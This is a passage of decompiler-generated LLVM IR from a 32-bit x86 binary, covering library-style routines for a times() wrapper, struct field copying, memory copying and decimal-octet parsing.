  store i32 %v1_8052884, i32* %v2_8052886, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805288f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805288b

dec_label_pc_805288b:                             ; preds = %dec_label_pc_805285f, %dec_label_pc_805287f
  %v2_805288f = phi i32 [ %v0_805285f, %dec_label_pc_805285f ], [ %v2_805288f.pre, %dec_label_pc_805287f ]
  %v0_805288b = phi i32 [ %v6_8052872, %dec_label_pc_805285f ], [ -1, %dec_label_pc_805287f ]
  store i32 %v2_805288f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805288b

; uselistorder directives
  uselistorder i32 %v6_8052872, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805288b, { 1, 0 }
}

define i32 @function_8052891(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052891:
  %stack_var_-12 = alloca i32, align 4
  %v0_8052892 = load i32, i32* @ebx, align 4
  %v0_8052896 = load i32, i32* @global_var_80543f8.71, align 8
  %v1_8052896 = icmp eq i32 %v0_8052896, 0
  %v1_80528a1 = icmp eq i1 %v1_8052896, false
  br i1 %v1_80528a1, label %dec_label_pc_80528b4, label %dec_label_pc_80528a3

dec_label_pc_80528a3:                             ; preds = %dec_label_pc_8052891
  %v1_80528a8 = call i32 @function_8052a6f(i32 0)
  %v2_80528b0 = icmp slt i32 %v1_80528a8, 0
  br i1 %v2_80528b0, label %dec_label_pc_80528d6, label %dec_label_pc_80528a3.dec_label_pc_80528b4_crit_edge

dec_label_pc_80528a3.dec_label_pc_80528b4_crit_edge: ; preds = %dec_label_pc_80528a3
  %v0_80528b6.pre = load i32, i32* @global_var_80543f8.71, align 8
  br label %dec_label_pc_80528b4

dec_label_pc_80528b4:                             ; preds = %dec_label_pc_80528a3.dec_label_pc_80528b4_crit_edge, %dec_label_pc_8052891
  %v0_80528c4 = phi i32 [ %v0_80528b6.pre, %dec_label_pc_80528a3.dec_label_pc_80528b4_crit_edge ], [ %v0_8052896, %dec_label_pc_8052891 ]
  %v1_80528b4 = icmp eq i32 %arg1, 0
  %v1_80528bb = icmp eq i1 %v1_80528b4, false
  store i32 %v0_80528c4, i32* @ebx, align 4
  br i1 %v1_80528bb, label %dec_label_pc_80528c1, label %dec_label_pc_80528d9

dec_label_pc_80528c1:                             ; preds = %dec_label_pc_80528b4
  %v2_80528c6 = add i32 %v0_80528c4, %arg1
  %v1_80528ca = call i32 @function_8052a6f(i32 %v2_80528c6)
  %v2_80528d2 = icmp slt i32 %v1_80528ca, 0
  %v1_80528d4 = icmp eq i1 %v2_80528d2, false
  br i1 %v1_80528d4, label %dec_label_pc_80528c1.dec_label_pc_80528d9_crit_edge, label %dec_label_pc_80528d6

dec_label_pc_80528c1.dec_label_pc_80528d9_crit_edge: ; preds = %dec_label_pc_80528c1
  %v0_80528d9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80528d9

dec_label_pc_80528d6:                             ; preds = %dec_label_pc_80528c1, %dec_label_pc_80528a3
  br label %dec_label_pc_80528d9

dec_label_pc_80528d9:                             ; preds = %dec_label_pc_80528b4, %dec_label_pc_80528c1.dec_label_pc_80528d9_crit_edge, %dec_label_pc_80528d6
  %v0_80528d9 = phi i32 [ %v0_80528d9.pre, %dec_label_pc_80528c1.dec_label_pc_80528d9_crit_edge ], [ -1, %dec_label_pc_80528d6 ], [ %v0_80528c4, %dec_label_pc_80528b4 ]
  %v2_80528db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80528db, i32* @edx, align 4
  store i32 %v0_8052892, i32* @ebx, align 4
  ret i32 %v0_80528d9

; uselistorder directives
  uselistorder i32 %v0_80528c4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8052a6f, { 1, 0 }
  uselistorder label %dec_label_pc_80528d9, { 2, 1, 0 }
}

define i32 @function_80528df(%tms* %arg1) local_unnamed_addr {
dec_label_pc_80528df:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80528df = load i32, i32* @edi, align 4
  store i32 %v0_80528df, i32* %stack_var_-4, align 4
  %v4_80528e3 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_80528e3, i32* %edi.global-to-local, align 4
  %v0_80528e7 = load i32, i32* @ebx, align 4
  %v3_80528ef = call i32 @times(%tms* %arg1)
  store i32 %v3_80528ef, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80528ef, -4095
  br i1 %tmp9, label %dec_label_pc_8052907, label %dec_label_pc_80528fb

dec_label_pc_80528fb:                             ; preds = %dec_label_pc_80528df
  %v1_80528fb = call i32 @function_805076b(i32 %v0_80528e7)
  %v0_8052900 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052900 = sub i32 0, %v0_8052900
  %v2_8052902 = inttoptr i32 %v1_80528fb to i32*
  store i32 %v1_8052900, i32* %v2_8052902, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805290b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052907

dec_label_pc_8052907:                             ; preds = %dec_label_pc_80528df, %dec_label_pc_80528fb
  %v2_805290b = phi i32 [ %v0_80528df, %dec_label_pc_80528df ], [ %v2_805290b.pre, %dec_label_pc_80528fb ]
  %v0_8052907 = phi i32 [ %v3_80528ef, %dec_label_pc_80528df ], [ -1, %dec_label_pc_80528fb ]
  store i32 %v2_805290b, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052907

; uselistorder directives
  uselistorder i32 %v3_80528ef, { 1, 0, 2 }
  uselistorder i32* @edi, { 5, 6, 7, 8, 9, 10, 159, 4, 164, 165, 172, 160, 0, 161, 162, 163, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 68, 69, 56, 57, 58, 59, 60, 61, 62, 1, 63, 64, 65, 66, 67, 170, 171, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 123, 22, 23, 24, 124, 125, 166, 167, 168, 169, 126, 127, 128, 129, 131, 132, 158, 114, 115, 116, 82, 83, 84, 85, 86, 87, 108, 109, 110, 111, 112, 113, 97, 98, 99, 103, 104, 105, 106, 107, 100, 101, 102, 133, 134, 135, 130, 136, 137, 138, 117, 25, 26, 27, 28, 29, 30, 118, 89, 88, 90, 91, 92, 93, 94, 95, 96, 119, 120, 121, 122, 139, 140, 141, 142, 143, 144, 145, 146, 147, 3, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 2, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052907, { 1, 0 }
}

define i32 @function_805290d(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805290d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805290e = load i32, i32* @ebx, align 4
  store i32 %v0_805290e, i32* %stack_var_-8, align 4
  %v4_8052912 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052912, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_805291f = inttoptr i32 %arg2 to i8*
  %v4_805291f = call i32 @function_80507bc(i8* %v3_805291f, i32 0, i32 88)
  store i32 %v4_805291f, i32* %eax.global-to-local, align 4
  %v2_8052924 = load i16, i16* %arg1, align 2
  %v3_8052924 = zext i16 %v2_8052924 to i32
  store i32 %v3_8052924, i32* %eax.global-to-local, align 4
  %v0_8052927 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052927 = add i32 %v0_8052927, 4
  %v2_8052927 = inttoptr i32 %v1_8052927 to i32*
  store i32 0, i32* %v2_8052927, align 4
  %v0_805292e = load i32, i32* %eax.global-to-local, align 4
  %v1_805292e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805292e = inttoptr i32 %v1_805292e to i32*
  store i32 %v0_805292e, i32* %v2_805292e, align 4
  %v0_8052930 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052930 = add i32 %v0_8052930, 4
  %v2_8052930 = inttoptr i32 %v1_8052930 to i32*
  %v3_8052930 = load i32, i32* %v2_8052930, align 4
  store i32 %v3_8052930, i32* %eax.global-to-local, align 4
  %v1_8052933 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052933 = add i32 %v1_8052933, 12
  %v3_8052933 = inttoptr i32 %v2_8052933 to i32*
  store i32 %v3_8052930, i32* %v3_8052933, align 4
  %v0_8052936 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052936 = add i32 %v0_8052936, 8
  %v2_8052936 = inttoptr i32 %v1_8052936 to i16*
  %v3_8052936 = load i16, i16* %v2_8052936, align 2
  %v4_8052936 = zext i16 %v3_8052936 to i32
  store i32 %v4_8052936, i32* %eax.global-to-local, align 4
  %v1_805293a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805293a = add i32 %v1_805293a, 16
  %v3_805293a = inttoptr i32 %v2_805293a to i32*
  store i32 %v4_8052936, i32* %v3_805293a, align 4
  %v0_805293d = load i32, i32* %esi.global-to-local, align 4
  %v1_805293d = add i32 %v0_805293d, 10
  %v2_805293d = inttoptr i32 %v1_805293d to i16*
  %v3_805293d = load i16, i16* %v2_805293d, align 2
  %v4_805293d = zext i16 %v3_805293d to i32
  store i32 %v4_805293d, i32* %eax.global-to-local, align 4
  %v1_8052941 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052941 = add i32 %v1_8052941, 20
  %v3_8052941 = inttoptr i32 %v2_8052941 to i32*
  store i32 %v4_805293d, i32* %v3_8052941, align 4
  %v0_8052944 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052944 = add i32 %v0_8052944, 12
  %v2_8052944 = inttoptr i32 %v1_8052944 to i16*
  %v3_8052944 = load i16, i16* %v2_8052944, align 2
  %v4_8052944 = zext i16 %v3_8052944 to i32
  store i32 %v4_8052944, i32* %eax.global-to-local, align 4
  %v1_8052948 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052948 = add i32 %v1_8052948, 24
  %v3_8052948 = inttoptr i32 %v2_8052948 to i32*
  store i32 %v4_8052944, i32* %v3_8052948, align 4
  %v0_805294b = load i32, i32* %esi.global-to-local, align 4
  %v1_805294b = add i32 %v0_805294b, 14
  %v2_805294b = inttoptr i32 %v1_805294b to i16*
  %v3_805294b = load i16, i16* %v2_805294b, align 2
  %v4_805294b = zext i16 %v3_805294b to i32
  store i32 %v4_805294b, i32* %eax.global-to-local, align 4
  %v1_805294f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805294f = add i32 %v1_805294f, 28
  %v3_805294f = inttoptr i32 %v2_805294f to i32*
  store i32 %v4_805294b, i32* %v3_805294f, align 4
  %v0_8052952 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052952 = add i32 %v0_8052952, 16
  %v2_8052952 = inttoptr i32 %v1_8052952 to i16*
  %v3_8052952 = load i16, i16* %v2_8052952, align 2
  %v4_8052952 = zext i16 %v3_8052952 to i32
  store i32 %v4_8052952, i32* %eax.global-to-local, align 4
  %v0_8052956 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052956 = add i32 %v0_8052956, 36
  %v2_8052956 = inttoptr i32 %v1_8052956 to i32*
  store i32 0, i32* %v2_8052956, align 4
  %v0_805295d = load i32, i32* %eax.global-to-local, align 4
  %v1_805295d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805295d = add i32 %v1_805295d, 32
  %v3_805295d = inttoptr i32 %v2_805295d to i32*
  store i32 %v0_805295d, i32* %v3_805295d, align 4
  %v0_8052960 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052960 = add i32 %v0_8052960, 20
  %v2_8052960 = inttoptr i32 %v1_8052960 to i32*
  %v3_8052960 = load i32, i32* %v2_8052960, align 4
  store i32 %v3_8052960, i32* %eax.global-to-local, align 4
  %v1_8052963 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052963 = add i32 %v1_8052963, 44
  %v3_8052963 = inttoptr i32 %v2_8052963 to i32*
  store i32 %v3_8052960, i32* %v3_8052963, align 4
  %v0_8052966 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052966 = add i32 %v0_8052966, 24
  %v2_8052966 = inttoptr i32 %v1_8052966 to i32*
  %v3_8052966 = load i32, i32* %v2_8052966, align 4
  store i32 %v3_8052966, i32* %eax.global-to-local, align 4
  %v1_8052969 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052969 = add i32 %v1_8052969, 48
  %v3_8052969 = inttoptr i32 %v2_8052969 to i32*
  store i32 %v3_8052966, i32* %v3_8052969, align 4
  %v0_805296c = load i32, i32* %esi.global-to-local, align 4
  %v1_805296c = add i32 %v0_805296c, 28
  %v2_805296c = inttoptr i32 %v1_805296c to i32*
  %v3_805296c = load i32, i32* %v2_805296c, align 4
  store i32 %v3_805296c, i32* %eax.global-to-local, align 4
  %v1_805296f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805296f = add i32 %v1_805296f, 52
  %v3_805296f = inttoptr i32 %v2_805296f to i32*
  store i32 %v3_805296c, i32* %v3_805296f, align 4
  %v0_8052972 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052972 = add i32 %v0_8052972, 32
  %v2_8052972 = inttoptr i32 %v1_8052972 to i32*
  %v3_8052972 = load i32, i32* %v2_8052972, align 4
  store i32 %v3_8052972, i32* %eax.global-to-local, align 4
  %v1_8052975 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052975 = add i32 %v1_8052975, 56
  %v3_8052975 = inttoptr i32 %v2_8052975 to i32*
  store i32 %v3_8052972, i32* %v3_8052975, align 4
  %v0_8052978 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052978 = add i32 %v0_8052978, 40
  %v2_8052978 = inttoptr i32 %v1_8052978 to i32*
  %v3_8052978 = load i32, i32* %v2_8052978, align 4
  store i32 %v3_8052978, i32* %eax.global-to-local, align 4
  %v1_805297b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805297b = add i32 %v1_805297b, 64
  %v3_805297b = inttoptr i32 %v2_805297b to i32*
  store i32 %v3_8052978, i32* %v3_805297b, align 4
  %v0_805297e = load i32, i32* %esi.global-to-local, align 4
  %v1_805297e = add i32 %v0_805297e, 48
  %v2_805297e = inttoptr i32 %v1_805297e to i32*
  %v3_805297e = load i32, i32* %v2_805297e, align 4
  store i32 %v3_805297e, i32* %eax.global-to-local, align 4
  %v1_8052981 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052981 = add i32 %v1_8052981, 72
  %v3_8052981 = inttoptr i32 %v2_8052981 to i32*
  store i32 %v3_805297e, i32* %v3_8052981, align 4
  %v2_8052987 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052987, i32* @ebx, align 4
  ret i32 %v3_805297e

; uselistorder directives
  uselistorder i32 72, { 2, 1, 3, 0 }
  uselistorder i32 64, { 5, 4, 3, 6, 0, 1, 2 }
  uselistorder i32 40, { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32 56, { 5, 4, 0, 1, 2, 3 }
  uselistorder i32 52, { 4, 3, 5, 6, 1, 2, 0 }
  uselistorder i32 48, { 11, 12, 10, 4, 9, 8, 0, 6, 2, 1, 7, 5, 13, 3 }
  uselistorder i32 32, { 29, 30, 64, 19, 28, 62, 63, 35, 36, 37, 1, 0, 2, 3, 23, 4, 5, 6, 7, 8, 58, 52, 53, 26, 42, 24, 51, 46, 47, 25, 50, 48, 49, 54, 55, 31, 32, 33, 34, 56, 43, 27, 44, 45, 57, 18, 59, 10, 9, 12, 11, 13, 14, 21, 20, 60, 61, 38, 39, 15, 40, 17, 16, 22, 41 }
  uselistorder i32 36, { 3, 2, 0, 1 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 12, 13, 10, 18, 19, 20, 11, 14, 15, 0, 1, 8, 36, 31, 21, 28, 29, 6, 26, 3, 37, 32, 7, 16, 5, 17, 33, 22, 4, 23, 24, 25, 27, 30, 34, 35, 38, 39, 40, 42, 41, 9, 2 }
  uselistorder i32 20, { 13, 14, 4, 11, 18, 19, 20, 12, 15, 16, 17, 0, 1, 10, 21, 8, 5, 9, 7, 6, 22, 23, 24, 2, 3 }
  uselistorder i32 16, { 40, 41, 33, 34, 35, 36, 37, 38, 15, 32, 74, 5, 43, 44, 45, 2, 6, 46, 47, 8, 7, 48, 3, 9, 39, 42, 16, 20, 31, 11, 12, 27, 49, 50, 10, 61, 62, 28, 0, 21, 25, 1, 22, 63, 26, 24, 29, 13, 23, 64, 65, 66, 67, 68, 69, 70, 30, 71, 4, 72, 17, 51, 52, 53, 54, 55, 56, 57, 58, 59, 19, 14, 60, 18, 73 }
  uselistorder i32 8, { 37, 26, 27, 28, 29, 30, 31, 32, 33, 16, 111, 17, 112, 18, 24, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 4, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 20, 5, 21, 6, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 19, 91, 92, 7, 93, 94, 95, 96, 8, 97, 34, 35, 36, 38, 110, 102, 103, 104, 22, 1, 2, 39, 40, 41, 42, 25, 105, 106, 107, 108, 10, 109, 98, 99, 100, 101, 11, 12, 13, 14, 15, 9, 23, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_80507bc, { 1, 4, 3, 2, 0 }
}

define i32 @function_805298a(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805298a:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805298b = load i32, i32* @esi, align 4
  store i32 %v0_805298b, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805298c = sdiv i32 %sext, 16777216
  store i32 %v4_805298c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052996 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052996, i32* %edi.global-to-local, align 4
  %v2_805299a = udiv i32 %v4_805298c, 4
  %v3_805299d = inttoptr i32 %arg2 to i8*
  %v4_805299d = bitcast i16* %arg1 to i8*
  %v5_805299d = call i8* @_memcpy(i8* %v4_805299d, i8* %v3_805299d, i32 %v2_805299a)
  %v0_805299f = load i32, i32* %eax.global-to-local, align 4
  %v2_805299f = and i32 %v0_805299f, 2
  %v3_805299f = icmp eq i32 %v2_805299f, 0
  br i1 %v3_805299f, label %dec_label_pc_80529a5, label %dec_label_pc_80529a3

dec_label_pc_80529a3:                             ; preds = %dec_label_pc_805298a
  %v0_80529a3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80529a3 = inttoptr i32 %v0_80529a3 to i16*
  %v2_80529a3 = load i16, i16* %v1_80529a3, align 2
  %v3_80529a3 = load i32, i32* %edi.global-to-local, align 4
  %v4_80529a3 = inttoptr i32 %v3_80529a3 to i16*
  store i16 %v2_80529a3, i16* %v4_80529a3, align 2
  %v5_80529a3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80529a3 = load i32, i32* %esi.global-to-local, align 4
  %v7_80529a3 = load i1, i1* @df, align 1
  %v8_80529a3 = select i1 %v7_80529a3, i32 -2, i32 2
  %v9_80529a3 = add i32 %v8_80529a3, %v5_80529a3
  %v10_80529a3 = add i32 %v8_80529a3, %v6_80529a3
  store i32 %v9_80529a3, i32* %edi.global-to-local, align 4
  store i32 %v10_80529a3, i32* %esi.global-to-local, align 4
  %v0_80529a5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529a5

dec_label_pc_80529a5:                             ; preds = %dec_label_pc_805298a, %dec_label_pc_80529a3
  %v0_80529a5 = phi i32 [ %v0_805299f, %dec_label_pc_805298a ], [ %v0_80529a5.pre, %dec_label_pc_80529a3 ]
  %v2_80529a5 = urem i32 %v0_80529a5, 2
  %v3_80529a5 = icmp eq i32 %v2_80529a5, 0
  br i1 %v3_80529a5, label %dec_label_pc_80529aa, label %dec_label_pc_80529a9

dec_label_pc_80529a9:                             ; preds = %dec_label_pc_80529a5
  %v0_80529a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80529a9 = inttoptr i32 %v0_80529a9 to i8*
  %v2_80529a9 = load i8, i8* %v1_80529a9, align 1
  %v3_80529a9 = load i32, i32* %edi.global-to-local, align 4
  %v4_80529a9 = inttoptr i32 %v3_80529a9 to i8*
  store i8 %v2_80529a9, i8* %v4_80529a9, align 1
  %v5_80529a9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80529a9 = load i32, i32* %esi.global-to-local, align 4
  %v7_80529a9 = load i1, i1* @df, align 1
  %v8_80529a9 = select i1 %v7_80529a9, i32 -1, i32 1
  %v9_80529a9 = add i32 %v8_80529a9, %v5_80529a9
  %v10_80529a9 = add i32 %v8_80529a9, %v6_80529a9
  store i32 %v9_80529a9, i32* %edi.global-to-local, align 4
  store i32 %v10_80529a9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80529aa

dec_label_pc_80529aa:                             ; preds = %dec_label_pc_80529a5, %dec_label_pc_80529a9
  store i32 %v4_8052996, i32* %eax.global-to-local, align 4
  %v2_80529ae = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80529ae, i32* @esi, align 4
  ret i32 %v4_8052996

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 5, 2, 3, 4, 0, 1 }
  uselistorder i1* @df, { 5, 6, 1, 0, 3, 4, 2 }
  uselistorder i32 4, { 3, 36, 37, 28, 29, 30, 31, 167, 168, 173, 174, 0, 178, 179, 180, 169, 15, 23, 170, 172, 175, 177, 50, 51, 52, 53, 54, 55, 4, 56, 57, 58, 59, 60, 61, 62, 63, 48, 49, 64, 17, 65, 66, 67, 68, 69, 70, 71, 5, 73, 72, 74, 6, 75, 16, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 8, 96, 97, 99, 98, 7, 176, 171, 27, 20, 32, 33, 34, 35, 38, 133, 134, 21, 100, 101, 22, 103, 104, 105, 143, 144, 145, 140, 141, 114, 115, 116, 135, 136, 137, 1, 138, 139, 123, 124, 125, 129, 130, 2, 131, 132, 126, 127, 128, 146, 147, 39, 40, 41, 42, 43, 44, 45, 46, 47, 117, 118, 119, 120, 121, 122, 142, 24, 148, 149, 150, 151, 153, 154, 152, 155, 158, 159, 160, 156, 157, 18, 166, 9, 161, 19, 162, 163, 164, 165, 106, 107, 108, 25, 109, 110, 10, 111, 112, 113, 11, 12, 13, 14, 102, 181, 26 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* @esi, { 108, 109, 29, 30, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 110, 111, 6, 112, 113, 114, 125, 128, 129, 130, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 31, 35, 2, 36, 37, 38, 39, 40, 41, 42, 32, 33, 34, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0, 65, 66, 67, 68, 3, 69, 5, 70, 71, 72, 73, 7, 97, 98, 20, 4, 21, 22, 23, 24, 25, 126, 127, 99, 100, 26, 74, 75, 76, 88, 92, 93, 94, 90, 91, 27, 28, 95, 89, 96, 101, 102, 103, 104, 105, 106, 107, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 131 }
  uselistorder label %dec_label_pc_80529aa, { 1, 0 }
  uselistorder label %dec_label_pc_80529a5, { 1, 0 }
}

define i32 @function_80529b1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80529b1:
  %v1_80529bc = icmp eq i8* %arg1, null
  br i1 %v1_80529bc, label %dec_label_pc_8052a3d, label %dec_label_pc_80529c0

dec_label_pc_80529c0:                             ; preds = %dec_label_pc_80529b1
  %v4_80529b8 = ptrtoint i8* %arg1 to i32
  %v0_80529ce.pre = load i32, i32* bitcast (i32** @global_var_805432c.72 to i32*), align 4
  br label %dec_label_pc_80529cb

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529c0, %dec_label_pc_8052a14
  %v0_8052a14 = phi i32 [ 0, %dec_label_pc_80529c0 ], [ %v2_8052a1a, %dec_label_pc_8052a14 ]
  %v2_8052a17 = phi i32 [ 1, %dec_label_pc_80529c0 ], [ %v3_8052a17, %dec_label_pc_8052a14 ]
  %v0_80529cb = phi i32 [ %v4_80529b8, %dec_label_pc_80529c0 ], [ %v0_80529cb3, %dec_label_pc_8052a14 ]
  %v1_80529cb = inttoptr i32 %v0_80529cb to i8*
  %v2_80529cb = load i8, i8* %v1_80529cb, align 1
  %v3_80529cb = sext i8 %v2_80529cb to i32
  %v2_80529d4 = mul nsw i32 %v3_80529cb, 2
  %v3_80529d4 = add i32 %v2_80529d4, %v0_80529ce.pre
  %v4_80529d4 = inttoptr i32 %v3_80529d4 to i8*
  %v5_80529d4 = load i8, i8* %v4_80529d4, align 1
  %v6_80529d4 = and i8 %v5_80529d4, 8
  %v7_80529d4 = icmp eq i8 %v6_80529d4, 0
  br i1 %v7_80529d4, label %dec_label_pc_8052a3d, label %dec_label_pc_80529db

dec_label_pc_80529db:                             ; preds = %dec_label_pc_80529cb
  %v4_80529ef.pre = load i32, i32* @edx, align 4
  %v2_80529ef34 = load i8, i8* %v1_80529cb, align 1
  %v3_80529ef35 = zext i8 %v2_80529ef34 to i32
  %v5_80529ef36 = and i32 %v4_80529ef.pre, -256
  %v6_80529ef37 = or i32 %v3_80529ef35, %v5_80529ef36
  store i32 %v6_80529ef37, i32* @edx, align 4
  %v2_80529f138 = sext i8 %v2_80529ef34 to i32
  %v2_80529f439 = mul nsw i32 %v2_80529f138, 2
  %v3_80529f440 = add i32 %v2_80529f439, %v0_80529ce.pre
  %v4_80529f441 = inttoptr i32 %v3_80529f440 to i16*
  %v5_80529f442 = load i16, i16* %v4_80529f441, align 2
  %v2_80529f944 = and i16 %v5_80529f442, 8
  %v3_80529f945 = icmp eq i16 %v2_80529f944, 0
  %v1_80529fb46 = icmp eq i1 %v3_80529f945, false
  br i1 %v1_80529fb46, label %dec_label_pc_80529df, label %dec_label_pc_80529fd

dec_label_pc_80529df:                             ; preds = %dec_label_pc_80529db, %dec_label_pc_80529ee
  %v2_80529f150 = phi i32 [ %v2_80529f1, %dec_label_pc_80529ee ], [ %v2_80529f138, %dec_label_pc_80529db ]
  %v6_80529ef49 = phi i32 [ %v6_80529ef, %dec_label_pc_80529ee ], [ %v6_80529ef37, %dec_label_pc_80529db ]
  %v0_80529ee48 = phi i32 [ %v1_80529ee, %dec_label_pc_80529ee ], [ %v0_80529cb, %dec_label_pc_80529db ]
  %v1_80529df47 = phi i32 [ %v3_80529e2, %dec_label_pc_80529ee ], [ 0, %dec_label_pc_80529db ]
  %v3_80529df = mul i32 %v1_80529df47, 10
  %v2_80529e2 = add i32 %v3_80529df, -48
  %v3_80529e2 = add i32 %v2_80529e2, %v2_80529f150
  %v1_80529e6 = add i32 %v3_80529e2, -255
  %v6_80529e6 = sub i32 254, %v3_80529e2
  %v7_80529e6 = and i32 %v6_80529e6, %v3_80529e2
  %v8_80529e6 = icmp slt i32 %v7_80529e6, 0
  %v9_80529e6 = icmp eq i32 %v1_80529e6, 0
  %v10_80529e6 = icmp slt i32 %v1_80529e6, 0
  %v3_80529ec = icmp eq i1 %v10_80529e6, %v8_80529e6
  %v4_80529ec = icmp eq i1 %v9_80529e6, false
  %v5_80529ec = and i1 %v4_80529ec, %v3_80529ec
  br i1 %v5_80529ec, label %dec_label_pc_8052a3d, label %dec_label_pc_80529ee

dec_label_pc_80529ee:                             ; preds = %dec_label_pc_80529df
  %v1_80529ee = add i32 %v0_80529ee48, 1
  %v1_80529ef = inttoptr i32 %v1_80529ee to i8*
  %v2_80529ef = load i8, i8* %v1_80529ef, align 1
  %v3_80529ef = zext i8 %v2_80529ef to i32
  %v5_80529ef = and i32 %v6_80529ef49, -256
  %v6_80529ef = or i32 %v3_80529ef, %v5_80529ef
  store i32 %v6_80529ef, i32* @edx, align 4
  %v2_80529f1 = sext i8 %v2_80529ef to i32
  %v2_80529f4 = mul nsw i32 %v2_80529f1, 2
  %v3_80529f4 = add i32 %v2_80529f4, %v0_80529ce.pre
  %v4_80529f4 = inttoptr i32 %v3_80529f4 to i16*
  %v5_80529f4 = load i16, i16* %v4_80529f4, align 2
  %v2_80529f9 = and i16 %v5_80529f4, 8
  %v3_80529f9 = icmp eq i16 %v2_80529f9, 0
  %v1_80529fb = icmp eq i1 %v3_80529f9, false
  br i1 %v1_80529fb, label %dec_label_pc_80529df, label %dec_label_pc_80529fd

dec_label_pc_80529fd:                             ; preds = %dec_label_pc_80529ee, %dec_label_pc_80529db
  %v1_80529df.lcssa = phi i32 [ 0, %dec_label_pc_80529db ], [ %v3_80529e2, %dec_label_pc_80529ee ]
  %v0_80529ee.lcssa = phi i32 [ %v0_80529cb, %dec_label_pc_80529db ], [ %v1_80529ee, %dec_label_pc_80529ee ]
  %v2_80529ef.lcssa = phi i8 [ %v2_80529ef34, %dec_label_pc_80529db ], [ %v2_80529ef, %dec_label_pc_80529ee ]
